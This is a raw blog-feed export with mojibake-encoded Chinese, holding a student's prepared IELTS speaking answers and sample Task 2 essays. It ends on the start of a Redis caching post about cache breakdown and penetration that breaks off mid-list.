        <content type="html"><![CDATA[<p>è®°å½•ä¸‹ä¸ªäººåšçš„éƒ¨åˆ†å‡†å¤‡,å¯ä»¥å‡†å¤‡ä¸€é,ä½†åƒä¸‡ä¸è¦èƒŒè¯µ,å¾ˆå®¹æ˜“è¢«å‘ç°çš„,ç‰¹åˆ«æ˜¯part 3æ˜¯å®Œå…¨ä¸èƒ½å‡†å¤‡çš„,æ‰€ä»¥å®¹æ˜“è¢«åˆ¤èƒŒé¢˜</p><h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h2><h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><h4 id="Are-you-good-at-memorizing-things"><a href="#Are-you-good-at-memorizing-things" class="headerlink" title="Are you good at memorizing things?"></a>Are you good at memorizing things?</h4><p>I would say my memory is average. I donâ€™t consider myself good at memorizing things, but I can usually remember important information when needed.</p><h4 id="Have-you-ever-forgotten-something-importantï¼Ÿ"><a href="#Have-you-ever-forgotten-something-importantï¼Ÿ" class="headerlink" title="Have you ever forgotten something importantï¼Ÿ"></a>Have you ever forgotten something importantï¼Ÿ</h4><p>Actually,I canâ€™t recall a time when I forgot something important.</p><h4 id="What-do-you-need-to-remember-in-your-daily-life"><a href="#What-do-you-need-to-remember-in-your-daily-life" class="headerlink" title="What do you need to remember in your daily life?"></a>What do you need to remember in your daily life?</h4><p>I need to remember my plan. Every night I lie in bed thinking about what I did today and what I should do tomorrow. The next day I wake up and think about the plan I made last night</p><h4 id="How-do-you-remember-important-things"><a href="#How-do-you-remember-important-things" class="headerlink" title="How do you remember important things?"></a>How do you remember important things?</h4><p>For important things, I always record them in my todolist and set a reminder time to remind me not to forget them.</p><h3 id="Celebrities"><a href="#Celebrities" class="headerlink" title="Celebrities"></a>Celebrities</h3><h4 id="Who-is-your-favourite-celebrity-in-your-country"><a href="#Who-is-your-favourite-celebrity-in-your-country" class="headerlink" title="Who is your favourite celebrity in your country?"></a>Who is your favourite celebrity in your country?</h4><p>My favourite celebrity is Lei Jun.He founded the brand Xiaomi(mi) from scratch, which is a high-tech company just like Apple. In addition, he majored in computer science at university, which is the same as mine.</p><h4 id="What-kind-of-famous-people-do-you-often-see-in-the-news"><a href="#What-kind-of-famous-people-do-you-often-see-in-the-news" class="headerlink" title="What kind of famous people do you often see in the news?"></a>What kind of famous people do you often see in the news?</h4><p>Singers and the founders of some Internet companies.Like Jack Ma, who is the founder of Alibaba.Like Taylor swift, kanye westâ€¦</p><h4 id="Do-you-pay-attention-to-famous-people-in-the-news"><a href="#Do-you-pay-attention-to-famous-people-in-the-news" class="headerlink" title="Do you pay attention to famous people in the news?"></a>Do you pay attention to famous people in the news?</h4><p>No,I donâ€™t pay attention to them.</p><h4 id="Do-you-believe-that-the-news-about-famous-people-in-the-media-is-true"><a href="#Do-you-believe-that-the-news-about-famous-people-in-the-media-is-true" class="headerlink" title="Do you believe that the news about famous people in the media is true?"></a>Do you believe that the news about famous people in the media is true?</h4><p>It canâ€™t be all true. As we all know, some people/media will create rumors to get attention.</p><h4 id="Would-you-like-to-be-famous"><a href="#Would-you-like-to-be-famous" class="headerlink" title="Would you like to be famous?"></a>Would you like to be famous?</h4><p>Of course. Despite all the trouble that comes with being famous, thatâ€™s the price of making money this way.</p><h3 id="Singing"><a href="#Singing" class="headerlink" title="Singing"></a>Singing</h3><h4 id="Do-you-like-singing-Why"><a href="#Do-you-like-singing-Why" class="headerlink" title="Do you like singing? Why?"></a>Do you like singing? Why?</h4><p>To be honest, I donâ€™t like singing very much. Itâ€™s mainly because Iâ€™m tone-deaf, so I canâ€™t sing well.</p><h4 id="Did-you-learn-to-sing-at-school"><a href="#Did-you-learn-to-sing-at-school" class="headerlink" title="Did you learn to sing at school?"></a>Did you learn to sing at school?</h4><p>Yes, we did. In primary school and middle school, we had music classes where our music teacher would sometimes teach us how to sing.</p><h4 id="Who-do-you-want-to-sing-for"><a href="#Who-do-you-want-to-sing-for" class="headerlink" title="Who do you want to sing for?"></a>Who do you want to sing for?</h4><p>Honestly, because Iâ€™m tone-deaf, I donâ€™t really want to sing for anyone in particular. I donâ€™t feel confident enough to perform for a specific person or audience.</p><h4 id="Do-you-think-singing-can-bring-happiness-to-people"><a href="#Do-you-think-singing-can-bring-happiness-to-people" class="headerlink" title="Do you think singing can bring happiness to people?"></a>Do you think singing can bring happiness to people?</h4><p>Absolutely! Singing brings joy to people, especially for those who are talented singers.</p><h3 id="Crowded-place"><a href="#Crowded-place" class="headerlink" title="Crowded place"></a>Crowded place</h3><h4 id="Is-the-city-where-you-live-crowded"><a href="#Is-the-city-where-you-live-crowded" class="headerlink" title="Is the city where you live crowded?"></a>Is the city where you live crowded?</h4><p>Yes, you know, Xi â€˜an is a tourist city and many places are very crowded.</p><h4 id="ls-there-a-crowded-place-near-where-you-live"><a href="#ls-there-a-crowded-place-near-where-you-live" class="headerlink" title="ls there a crowded place near where you live?"></a>ls there a crowded place near where you live?</h4><p>No, there isnâ€™t a crowded place near where I live. My school is located in the suburb, so there are very few people around.</p><h4 id="Do-you-like-crowded-places"><a href="#Do-you-like-crowded-places" class="headerlink" title="Do you like crowded places?"></a>Do you like crowded places?</h4><p>NO. It just makes me feel annoyed when there are too many people around.</p><h4 id="Do-most-people-like-crowded-places"><a href="#Do-most-people-like-crowded-places" class="headerlink" title="Do most people like crowded places?"></a>Do most people like crowded places?</h4><p>Well, it really depends on the person. Like me, I donâ€™t like crowded places. But some of my friends, they like crowded places.</p><h4 id="When-was-the-last-time-you-were-in-a-crowded-place"><a href="#When-was-the-last-time-you-were-in-a-crowded-place" class="headerlink" title="When was the last time you were in a crowded place?"></a>When was the last time you were in a crowded place?</h4><p>Last yearâ€™s National Day holidays, I went to Mountain Hua, not far from xian, and it was very crowded.</p><h3 id="Feeling-bored"><a href="#Feeling-bored" class="headerlink" title="Feeling bored"></a>Feeling bored</h3><h4 id="Do-you-often-feel-bored"><a href="#Do-you-often-feel-bored" class="headerlink" title="Do you often feel bored?"></a>Do you often feel bored?</h4><p>Yes. I often feel bored.</p><h4 id="When-do-you-feel-bored"><a href="#When-do-you-feel-bored" class="headerlink" title="When do you feel bored?"></a>When do you feel bored?</h4><p>I usually feel bored when Iâ€™m exhausted . Itâ€™s like I have no energy to do anything, but at the same time, I find everything around me quite boring.</p><h4 id="What-do-you-do-when-you-feel-bored"><a href="#What-do-you-do-when-you-feel-bored" class="headerlink" title="What do you do when you feel bored?"></a>What do you do when you feel bored?</h4><p>When Iâ€™m bored, I often lie in bed, watch funny videos on Tiktok, or listen to podcasts.</p><h4 id="Do-you-think-childhood-is-boring-or-adulthood-is-boring"><a href="#Do-you-think-childhood-is-boring-or-adulthood-is-boring" class="headerlink" title="Do you think childhood is boring or adulthood is boring?"></a>Do you think childhood is boring or adulthood is boring?</h4><p>â€¦</p><h3 id="Collecting-things"><a href="#Collecting-things" class="headerlink" title="Collecting things"></a>Collecting things</h3><h4 id="Do-you-collect-things"><a href="#Do-you-collect-things" class="headerlink" title="Do you collect things?"></a>Do you collect things?</h4><p>No,I donâ€™t have such a hobby.</p><h4 id="Are-there-any-things-you-have-kept-from-childhood"><a href="#Are-there-any-things-you-have-kept-from-childhood" class="headerlink" title="Are there any things you have kept from childhood?"></a>Are there any things you have kept from childhood?</h4><p>Yes, I have a piggy bank that my grandmother gave me when I was a child. I usually put my spare change in it.</p><h4 id="Where-do-you-usually-keep-things-you-need"><a href="#Where-do-you-usually-keep-things-you-need" class="headerlink" title="Where do you usually keep things you need?"></a>Where do you usually keep things you need?</h4><p>I usually keep things I need in easily accessible places like the bookshelf, desk, or my bag. Itâ€™s convenient to have them within reach so that I can easily find and use them when needed.</p><h4 id="Would-you-keep-old-things-for-a-long-time-Why"><a href="#Would-you-keep-old-things-for-a-long-time-Why" class="headerlink" title="Would you keep old things for a long time? Why?"></a>Would you keep old things for a long time? Why?</h4><p>Yes, I would keep some old things for a long time. Itâ€™s because these things either have a practical use or hold sentimental value for me.</p><h3 id="Music"><a href="#Music" class="headerlink" title="Music"></a>Music</h3><h4 id="Do-a-lot-of-people-like-music"><a href="#Do-a-lot-of-people-like-music" class="headerlink" title="Do a lot of people like music?"></a>Do a lot of people like music?</h4><p>Absolutely! Music has this unique healing power.It has the ability to touch our souls and uplift our spirits</p><h4 id="What-kind-of-music-do-you-listen-to"><a href="#What-kind-of-music-do-you-listen-to" class="headerlink" title="What kind of music do you listen to?"></a>What kind of music do you listen to?</h4><p>Iâ€™m really into country music, like Hotel California, Mine. I love how country music is all about storytelling . Itâ€™s like a window into someoneâ€™s life and experiences.(taylorçš„ä¸“è¾‘Speak Now)</p><h4 id="ls-it-easy-to-learn-music"><a href="#ls-it-easy-to-learn-music" class="headerlink" title="ls it easy to learn music?"></a>ls it easy to learn music?</h4><p>No, .. I often canâ€™t get the beat right</p><h4 id="Did-you-have-music-lessons-at-school"><a href="#Did-you-have-music-lessons-at-school" class="headerlink" title="Did you have music lessons at school?"></a>Did you have music lessons at school?</h4><p>yes..</p><h3 id="Money"><a href="#Money" class="headerlink" title="Money"></a>Money</h3><h4 id="How-do-you-save-money"><a href="#How-do-you-save-money" class="headerlink" title="How do you save money?"></a>How do you save money?</h4><p>Well, one way I save money is by eating at the canteen instead of going out to restaurants.  Additionally, I try to cut back on buying unnecessary clothing and electronics. </p><h4 id="Do-you-prefer-to-save-money-or-spend-money"><a href="#Do-you-prefer-to-save-money-or-spend-money" class="headerlink" title="Do you prefer to save money or spend money?"></a>Do you prefer to save money or spend money?</h4><p>Oh, I definitely enjoy spending money and the happiness it brings. Of course, I also save money, but for me, saving is just a way to be able to spend better in the future.</p><h4 id="Do-you-use-a-payment-app-on-your-mobile-phone-to-buy-things"><a href="#Do-you-use-a-payment-app-on-your-mobile-phone-to-buy-things" class="headerlink" title="Do you use a payment app on your mobile phone to buy things?"></a>Do you use a payment app on your mobile phone to buy things?</h4><p>yes, â€¦</p><h4 id="Do-you-use-a-credit-card-to-buy-things"><a href="#Do-you-use-a-credit-card-to-buy-things" class="headerlink" title="Do you use a credit card to buy things?"></a>Do you use a credit card to buy things?</h4><p>No, I donâ€™t have a credit card. Iâ€™m still a student and I donâ€™t have a full-time job, so I canâ€™t apply for one.</p><h4 id="Do-you-think-cash-will-still-be-popular-in-the-future"><a href="#Do-you-think-cash-will-still-be-popular-in-the-future" class="headerlink" title="Do you think cash will still be popular in the future?"></a>Do you think cash will still be popular in the future?</h4><p>â€¦</p><h3 id="Cake"><a href="#Cake" class="headerlink" title="Cake"></a>Cake</h3><h4 id="Do-you-know-how-to-bake-a-cake"><a href="#Do-you-know-how-to-bake-a-cake" class="headerlink" title="Do you know how to bake a cake?"></a>Do you know how to bake a cake?</h4><p>Oh, Iâ€™m completely clueless when it comes to baking.</p><h4 id="Do-you-like-to-have-dessert-after-a-meal"><a href="#Do-you-like-to-have-dessert-after-a-meal" class="headerlink" title="Do you like to have dessert after a meal?"></a>Do you like to have dessert after a meal?</h4><p>no,â€¦</p><h4 id="Do-you-like-to-eat-cakes-or-other-sweet-foods"><a href="#Do-you-like-to-eat-cakes-or-other-sweet-foods" class="headerlink" title="Do you like to eat cakes or other sweet foods?"></a>Do you like to eat cakes or other sweet foods?</h4><p>no,â€¦</p><h4 id="Did-you-like-to-eat-cakes-as-a-child"><a href="#Did-you-like-to-eat-cakes-as-a-child" class="headerlink" title="Did you like to eat cakes as a child?"></a>Did you like to eat cakes as a child?</h4><p>definately, every child likes cakes, doesnâ€™t he?</p><h4 id="Are-there-any-traditional-Chinese-cakes"><a href="#Are-there-any-traditional-Chinese-cakes" class="headerlink" title="Are there any traditional Chinese cakes?"></a>Are there any traditional Chinese cakes?</h4><p>Yes,.. For instance, thereâ€™s mooncake, which is essential during the Mid-Autumn Festival. We also have rice cakes for Chinese New Year, which are very popular in the south.</p><h3 id="Colors"><a href="#Colors" class="headerlink" title="Colors"></a>Colors</h3><h4 id="What-is-your-favorite-color"><a href="#What-is-your-favorite-color" class="headerlink" title="What is your favorite color?"></a>What is your favorite color?</h4><p>My favorite color is sky blue.This color makes me feel relaxed, as if I was lying on the grass looking at the blue sky.</p><h4 id="Are-there-any-colors-that-have-a-special-meaning-in-your-country"><a href="#Are-there-any-colors-that-have-a-special-meaning-in-your-country" class="headerlink" title="Are there any colors that have a special meaning in your country?"></a>Are there any colors that have a special meaning in your country?</h4><p>In my country, the color green, especially when it comes to a green hat, means that your partner is being unfaithful. </p><h4 id="Do-you-think-different-types-of-people-like-different-colors"><a href="#Do-you-think-different-types-of-people-like-different-colors" class="headerlink" title="Do you think different types of people like different colors?"></a>Do you think different types of people like different colors?</h4><p>Definitely! Peopleâ€™s preferences for colors can vary greatly.  Itâ€™s all about personal taste and individuality.</p><h4 id="Whatâ€™s-the-colour-you-dislike-Why"><a href="#Whatâ€™s-the-colour-you-dislike-Why" class="headerlink" title="Whatâ€™s the colour you dislike?Why?"></a>Whatâ€™s the colour you dislike?Why?</h4><p>Honestly, I donâ€™t really have a color that I dislike, but if I had to choose one, it would probably be yellow. Itâ€™s not that I hate it, but itâ€™s just not a color that Iâ€™m particularly fond of. I guess itâ€™s because it can be quite bright and overwhelming at times.</p><h3 id="others"><a href="#others" class="headerlink" title="others"></a>others</h3><h4 id="What-do-people-often-do-on-social-media"><a href="#What-do-people-often-do-on-social-media" class="headerlink" title="What do people often do on social media?"></a>What do people often do on social media?</h4><p>Connecting with others, Sharing updates, Following interests</p><h4 id="ls-there-an-advertisement-that-made-an-impression-on-you-when-you-were-a-child"><a href="#ls-there-an-advertisement-that-made-an-impression-on-you-when-you-were-a-child" class="headerlink" title="ls there an advertisement that made an impression on you when you were a child?"></a>ls there an advertisement that made an impression on you when you were a child?</h4><p>It was a commercial for a game console endorsed by Jackie Chan, which I remember was kind of funny.</p><h4 id="What-kind-of-clothes-do-you-like-to-wear"><a href="#What-kind-of-clothes-do-you-like-to-wear" class="headerlink" title="What kind of clothes do you like to wear?"></a>What kind of clothes do you like to wear?</h4><p>I like to wear casual clothes.They are comfortable and practical, suitable for most occasions, not too expensive.</p><h4 id="Do-you-prefer-to-chat-with-a-group-of-people-or-with-only-one-friend"><a href="#Do-you-prefer-to-chat-with-a-group-of-people-or-with-only-one-friend" class="headerlink" title="Do you prefer to chat with a group of people or with only one friend?"></a>Do you prefer to chat with a group of people or with only one friend?</h4><p>Personally, I prefer to chat with just one friend. When chatting with a group of people, the topics can easily digress. But with one friend, we can have a more focused and meaningful conversation.</p><h4 id="Do-you-argue-with-friends"><a href="#Do-you-argue-with-friends" class="headerlink" title="Do you argue with friends?"></a>Do you argue with friends?</h4><p>Yes, sometimes. I think itâ€™s unavoidable, even best friends can sometimes get into arguments.</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTSä¼˜ç§€å¤§ä½œæ–‡åˆ†äº«</title>
      <link href="/2024/03/23/2024-3-23-IELTS%E5%A4%A7%E4%BD%9C%E6%96%87/"/>
      <url>/2024/03/23/2024-3-23-IELTS%E5%A4%A7%E4%BD%9C%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h3 id="IELTSä¼˜ç§€å¤§ä½œæ–‡åˆ†äº«"><a href="#IELTSä¼˜ç§€å¤§ä½œæ–‡åˆ†äº«" class="headerlink" title="IELTSä¼˜ç§€å¤§ä½œæ–‡åˆ†äº«"></a>IELTSä¼˜ç§€å¤§ä½œæ–‡åˆ†äº«</h3><h4 id="Agree-Disagree"><a href="#Agree-Disagree" class="headerlink" title="Agree/Disagree"></a>Agree/Disagree</h4><p>è¿™ç¯‡7.5-8.5åˆ†</p><p><strong>é¢˜ç›®</strong>: Women and men are commmonly seen as having different strengthes and weakness. Some people think it is right to excludemales and females from certian professions because of their gender. To extend do you agree or disagree?</p><p><strong>æ­£æ–‡</strong>:</p><p>Social issues related to gender have been widely discussed among people over centuries. Due to gender differences, some people have claimed that certain jobs should accept either men or women. However, such a statement suffers from logical and factual problems. I hardly agree with this one-side proposal.</p><p>To begin with, limiting the access to certain occupations on the basis of gender may ignore the individualities since the over-generalized characteristics of men and women are not always universal. Such an act may hurt the whole society. For instance, if females are only allowed to enter particular careers be them nurses, teachers or accountants, those who are unenthusiastic and unable to handle these work and rejected from other professions might take these important positions. Males that are authentically passionate about these jobs will be faced with the risks of being jobless. Hence, the overall domestic unemployment rate will increase. </p><p>Additionally, in a society where the exclusion of men or women from certain jobs is taken for granted by people, pre-existing gender stereotypes tend to be reinforced, which is undesirable for social equality. For example, in many parts of the world girls are either explicitly or implicitly barred from entering certain professions such as science. As a result, girls might be discouraged from taking science classes at an early age, and later have less chance of finding good jobs. Had it not been for such bias, the society would have been more productive.</p><p>Admittedly, females and males with naturally-selected biological dissimilarities either on brain structures or genes grant differentiated cognitive skills or physical strengths. Hence, labor division according to genders might enable a society to achieve productive efficiency. However, the collaboration and cooperation between women and men making full use of their distinctive advantages might further facilitate the efficiency of working, which has been studied extensively by multiple groups of researchers worldwide.</p><p>In conclusion, having considered both sides of the statement, I still believe that in a diverse and dynamic society, people, regardless of their gender, ought to have equal opportunities and access to compete for the jobs that they desire for.</p><h4 id="Agree-Disagree-1"><a href="#Agree-Disagree-1" class="headerlink" title="Agree/Disagree"></a>Agree/Disagree</h4><p>è¿™æ˜¯æˆ‘è‡ªå·±ä»¿å†™çš„ä¸€ç¯‡, å¤§æ¦‚6.5çš„æ ·å­,å¼€å¤´æ®µæ¯”è¾ƒè‰ç‡,ç¬¬å››æ®µçš„è½¬æŠ˜ä¹Ÿä¸å¤Ÿå……åˆ†</p><p><strong>é¢˜ç›®</strong>: Some countries spend a lot of money preparing competitors to take part in major competitions such as Olympic Games or football World Cup. Some people say that it would be better to spend this money encouraging children to take up sports from a young age. To what extent do you agree or disagree? </p><p><strong>æ­£æ–‡</strong>:</p><p>Nowadays, various countries are investing a large amount of money in major competitions. Some people claim that it would be better to use the budget to encourage children to take part in sports from a young age. I completely agree with this opinion.</p><p>To begin with, children are the future of society. <code>No amount of money is too much to invest in the cultivation of children</code>. If such a budget is used to invest in childrenâ€™s sports competition, more and more children will participate in the sport which they are interested in. As a result, the next generation of our country will be stronger and more healthy. Hence, disease rates would decrease and life expectancy would increase.</p><p>Additionally, investing in children has a higher <code>return on investment</code>.  The current competitors for sports will soon age and become unable to participate in sporting events. By contrast, children are unshaped, and it is much easier to develop them into good athletes than it is to develop adult athletes. Therefore, spending the governmentâ€™s national budget on children will facilitate the early preparation and training of successful sportsmen in the future. </p><p>It cannot be denied that spending the budget on existing athletes is effective and we may achieve certain results in the short term. However, in the long run, the only way to achieve greater success is to develop their sports interests and skills in childhood.</p><p>In conclusion, having considered both sides of the statement, I firmly maintain the perspective that investing the funds in promoting early engagement in sports among children is preferable to investing in training athletes for participation in major competitions.</p><h4 id="Positive-Negative"><a href="#Positive-Negative" class="headerlink" title="Positive/Negative"></a>Positive/Negative</h4><p>7.5/8.0</p><p><strong>é¢˜ç›®</strong>: Nowdays itâ€™s become easier and more affordable for people to visit other countries. Is it a positive or negative development?</p><p><strong>æ­£æ–‡</strong>:</p><p>It cannot be denied that as international travel is becoming easier and more affordable, certain issues and inconvenience have been brought to both the travelers and locals. As a result, some impressionable(æ˜“å—å½±å“çš„) people might form the bias(åè§) that the development of international travel is more of a negative development. Nevertheless(ä¸è¿‡), as far as culture and globalization, international economy, and environmental protection are concerned, such a development is for sure a positive one. </p><p>First and foremost, the increasing easiness and affordability of international travel promotes both the spread of domestic culture and learning of foreign culture, contributing to a deeper international mutual understanding. Due to difference in ideology and value, nations around the world usually hold stereotype opinions on others, causing difficulties in personal, business, and political communication and cooperation. Easier international travel not only enables travelers to show the world what their true life is, but showcase the world right in front of the travelers. </p><p>Second, the fact that easier international travel promotes the growth of international economy indicates that it is definitely a positive development. Take Thailand, a country that benefits greatly from tourism, for example. Thanks to the easiness of international travel in modern days, the reasonable cost of living, fantastic sightseeing spots, and charming culture in Thailand can be enjoyed by people around the world. As a result, about 25% of Thailandâ€™s economy is closely associated with tourism, which has provided tons of jobs for locals. Had it not been for the easiness and affordability in international travel, Thailand would not have been able to attract international travels or create jobs for citizens.</p><p>A voice arises that international travel could bring devastating effects to the local environment due to pollution. Ironically, it is usually not the travelers who bring damage but lack of funding or poor management. Particularly in developing regions, without the income from travelers, the locals would have no choice but to exploit natural resources and damage the environment; on the other hand, effective tourism management can not only generate funding for the environmental protection but keep the sightseeing spots from being affected.</p><p>Therefore, in terms of culture and globalization, international economy, and environmental protection, I strongly hold the opinion that easier international travel is a positive development. <code>While one sees a circle and another sees a zero</code>(ä»è€…è§ä»æ™ºè€…è§æ™º), I believe my opponents will compromise upon being shown to my article</p><h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><p>7.5/8.0</p><p><strong>é¢˜ç›®</strong>: In some countries, the number of people who use bicycles as their main form of transport is decreasing even though riding bicycles has many benefits. What are the reasons? What could be done to encourage the use of bicycles.</p><p><strong>æ­£æ–‡</strong>:</p><p>It cannot be denied that bicycle is an invention that has existed for a long time in human history, and such a fact leads some to have the idea that bicycle is a thing of the past. However, such an idea needs to be scrutinized meticulously before a conclusion can be reached. </p><p>First and foremost, it is a fact that due to the development of technology, the use of bicycle has declined dramatically as peopleâ€™s main form of transport. We now have faster and more efficient ways of communication â€“ private cars, subways, and bus rapid transit â€“ which take us to our intended destinations easily and conveniently, without the need to keep the bulky bikes with us when we hang out with friends, and not to mention the trouble of keeping them in a safe place from theft. </p><p>Although some might claim that bikes are outdated, bicycles in fact have significant benefits to both individuals and the society in terms of health and the environment. For us, riding bikes not only helps us dodge traffic congestions during peak hours, but promote our physical health through moderate aerobic exercise and mental health through distracting us from intensive study or professional work; on the other hand, the use of vehicles has caused major cities around the globe the problem of air pollution such as smog, and the wide adoption of bikes could contain such issues â€“ the success in Amsterdam, Netherland and Copenhagen, Denmark are two successful cases in point. </p><p>In my opinion, it is through the combination of technology and governmental policy that we can best encourage the use of bicycles. To be more specific, the wide adoption of mobile devices and GPS technology has enabled the birth of shared bikes, which not only complements conventional ways of transportation but eliminates the need for carrying or storage; furthermore, governmental subsidies could be provided to companies that operate shared bikes, and those who do not own private cars and frequently use bicycles. The synergy from such a combination will effectively work as an incentive to boost the use of bicycles.</p><p>In conclusion, the use of bicycles has numerous advantages to our modern society, and it should be promoted. While one sees a zero and another sees a circle, I am confident that my opponents will compromise after being shown to my article. </p><h4 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h4><p>7.5+</p><p><strong>é¢˜ç›®</strong>: In education and employment, some people work harder than others. Why do some people work harder than others? Is it always a good thing to work hard?</p><p><strong>æ­£æ–‡</strong>:</p><p>It cannot be denied that spending more time and effort on our work and study could usually yield more results, and such a fact leads some to generate the opinion that working harder than others is the very principle of life. However, such an idea needs to be scrutinized meticulously before a conclusion can be reached.</p><p>First and foremost, it is a fact that due to the accelerating pace of life caused by the growth of economy, many tend to work harder than others. More goods and services are now available to us, combined with the effect of advertising, it is a natural tendency for people to desire what they do not have, resulting in an increasing number of diligent students and workers who aim to enjoy these products, tangible or intangible; furthermore, the growth of economy in recent centuries has also conglomerated societal wealth into the hands of a few, further burdening the ordinary working class who do not have power.</p><p>Second, the fact that technology has allowed the fast spread of information indicates that people work harder as they see more â€œrole models.â€ Take the case of the successful stories of entrepreneurs that we almost hear about every day on social media via mobile devices: while they are indeed a tiny portion of the population, the high frequency in which we hear about the stories leaves us the impression that such is the norm for every individual. Had it not been for such development in the society, we would never have formed such a value.</p><p>Although some might claim that working hard is a virtue, such philosophy in fact might compromise multiple aspects of our life and the society. For us, extended working or study hours could lead to a lack of physical exercise and communication with our family and beloved ones, damaging our physical and mental health and then forming a vicious cycle in the efficiency of our work and study; on the other hand, a society with a heavy focus on â€œworking hard,â€ namely material wealth, will produce an atmosphere with an animosity between people as they view everyone else a competitor, losing the capacity of humanity in the culture of the city, eventually forcing its citizens out due to excessive pressure and mental suffering. </p><p>In conclusion, always working harder is a belief that carrys risk to both individuals and the society. While one sees a zero and another sees a circle, I am confident that my opponents will compromise after being shown to my article.</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisç¼“å­˜é—®é¢˜:ç©¿é€,å‡»ç©¿,é›ªå´©,åŒå†™ä¸€è‡´æ€§ç­‰</title>
      <link href="/2024/03/15/2024-3-15-redis%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/"/>
      <url>/2024/03/15/2024-3-15-redis%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="Redisç¼“å­˜é—®é¢˜-Redisç¼“å­˜é—®é¢˜-ç©¿é€-å‡»ç©¿-é›ªå´©-åŒå†™ä¸€è‡´æ€§ç­‰"><a href="#Redisç¼“å­˜é—®é¢˜-Redisç¼“å­˜é—®é¢˜-ç©¿é€-å‡»ç©¿-é›ªå´©-åŒå†™ä¸€è‡´æ€§ç­‰" class="headerlink" title="Redisç¼“å­˜é—®é¢˜:Redisç¼“å­˜é—®é¢˜:ç©¿é€,å‡»ç©¿,é›ªå´©,åŒå†™ä¸€è‡´æ€§ç­‰"></a>Redisç¼“å­˜é—®é¢˜:Redisç¼“å­˜é—®é¢˜:ç©¿é€,å‡»ç©¿,é›ªå´©,åŒå†™ä¸€è‡´æ€§ç­‰</h2><p>åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹,æ•°æ®åº“å¾€å¾€æ˜¯æœ€è–„å¼±çš„ç¯èŠ‚,æˆ‘ä»¬é€šå¸¸é€‰æ‹©ä½¿ç”¨<code>redis</code>æ¥è¿›è¡Œç¼“å­˜,ä»¥èµ·åˆ°ç¼“å†²ä½œç”¨,æ¥é™ä½æ•°æ®åº“çš„å‹åŠ›,ä½†æ˜¯ä¸€æ—¦ç¼“å­˜å‡ºç°é—®é¢˜,ä¹Ÿä¼šå¯¼è‡´æ•°æ®åº“ç¬é—´å‹åŠ›è¿‡å¤§ç”šè‡³å´©æºƒ,ä»è€Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿå´©æºƒ.ä»Šå¤©å°±èŠèŠå¸¸è§çš„<code>redis</code>ç¼“å­˜é—®é¢˜.</p><h3 id="ç¼“å­˜å‡»ç©¿"><a href="#ç¼“å­˜å‡»ç©¿" class="headerlink" title="ç¼“å­˜å‡»ç©¿"></a>ç¼“å­˜å‡»ç©¿</h3><p>ç¼“å­˜å‡»ç©¿ä¸€èˆ¬æŒ‡redisä¸­çš„ä¸€ä¸ªçƒ­ç‚¹æ•°æ®è¿‡æœŸ,å¯¼è‡´å¤§é‡è¯·æ±‚ç›´æ¥è®¿é—®æ•°æ®åº“çš„æƒ…å†µ,å¯¼è‡´æ•°æ®åº“ç¬é—´å‹åŠ›è¿‡å¤§ç”šè‡³å´©æºƒ.</p><p><strong>è§£å†³æ–¹æ¡ˆ:</strong></p><ol><li>è®¾ç½®çƒ­ç‚¹æ•°æ®æ°¸ä¸è¿‡æœŸ,è¿™æ˜¯ä¸€ä¸ªä¸é”™çš„æ–¹æ¡ˆ(è¦è€ƒè™‘ä¸šåŠ¡ç‰¹æ€§,ä½“é‡ä»¥åŠæˆæœ¬),<strong>å‰æ</strong>æ˜¯çƒ­ç‚¹æ•°æ®ä¸èƒ½é¢‘ç¹å‘ç”Ÿæ”¹å˜,å¦åˆ™å°±ä¼šå‡ºç°ç¼“å­˜æ±¡æŸ“.æœ€å¥½æ˜¯æ ¹æ®ä¸€å®šçš„ç­–ç•¥è¿›è¡Œå®šæ—¶æ›´æ–°</li><li>é‡è¦æ¥å£é™æµ,åšå¥½ç†”æ–­å’Œé™çº§çš„å‡†å¤‡,sentinelæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©</li><li>ä½¿ç”¨äº’æ–¥é”,ä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥è®¿é—®æ•°æ®åº“,è¿™ä½•å°ä¸æ˜¯ä¸€ç§é™æµå‘¢</li></ol><h3 id="ç¼“å­˜ç©¿é€"><a href="#ç¼“å­˜ç©¿é€" class="headerlink" title="ç¼“å­˜ç©¿é€"></a>ç¼“å­˜ç©¿é€</h3><p>ç¼“å­˜ç©¿é€æŒ‡ç¼“å­˜å’Œæ•°æ®åº“ä¸­éƒ½æ²¡æœ‰çš„æ•°æ®,ç”¨æˆ·ä¸æ–­å‘èµ·è¯·æ±‚.è¿™ç§æƒ…å†µæœ€å¯èƒ½å°±æ˜¯æœ‰äººè¯•å›¾æ¶æ„æ”»å‡»ç³»ç»Ÿ</p><p><strong>è§£å†³æ–¹æ¡ˆ:</strong></p><ol><li>åŠ æ ¡éªŒ:æ‹¦æˆªéæ³•è¯·æ±‚,ç”¨æˆ·é‰´æƒç­‰</li><li>redisç¼“å­˜ä¸€ä¸ªæ— æ•ˆå€¼,ä»¥é˜²æ­¢å¯¹åŒä¸€ä¸ªkeyåœ¨æ•°æ®åº“ä¸­çš„å¤šæ¬¡æŸ¥è¯¢,ä½†redisä¸­å¯èƒ½ä¼šå‡ºç°å¤§é‡æ— æ•ˆå€¼,å¯¼è‡´ç¼“å­˜æ±¡æŸ“,æ‰€ä»¥è¦å°†æœ‰æ•ˆæ—¶é—´è®¾ç½®å¾—çŸ­ä¸€äº›</li><li>æ·»åŠ 